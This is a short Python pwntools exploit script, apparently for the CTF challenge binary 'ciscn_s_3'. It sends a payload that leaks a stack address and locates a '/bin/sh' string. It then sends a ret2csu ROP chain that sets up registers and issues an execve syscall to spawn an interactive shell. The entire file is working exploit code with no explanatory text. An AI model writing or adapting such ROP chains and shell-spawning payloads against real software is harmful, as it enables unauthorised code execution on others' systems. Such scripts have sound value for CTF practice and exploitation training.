from pwn import *
# from LibcSearcher import *
 
io = process("./ciscn_s_3")
elf = ELF("./ciscn_s_3")
 
csu_front = 0x400580
# mov rdx , r13
# mov rsi , r14
# mov edi . r15d
csu_rear = 0x40059B
# pop rbp
# pop r12
# pop r13
# pop r14
# pop r15
# ret
main_addr = 0x400587
execve_call = 0x4004E2
# mov rax , 3BH
vuln_addr = 0x4004ED
rdi_addr = 0x4005A3
syscall = 0x400501
 
context.log_level = 'debug'
 
payload_leak = b'/bin/sh\x00' + b'A' * 8 + p64(vuln_addr)
io.sendline(payload_leak)
io.recv(0x20)
stack_addr = u64(io.recv(8))
print(hex(stack_addr))
bin_sh_addr = stack_addr - 0x148
 
payload = b'/bin/sh\x00' + p64(rdi_addr) + p64(csu_rear)
# rbp . r12 . r13 . r14 . r15
payload += p64(0) + p64(bin_sh_addr + 0x08) + p64(0) + p64(0) +p64(bin_sh_addr)
payload += p64(csu_front) + p64(execve_call) + p64(rdi_addr) + p64(bin_sh_addr) + p64(syscall)
 
io.sendline(payload)
io.interactive()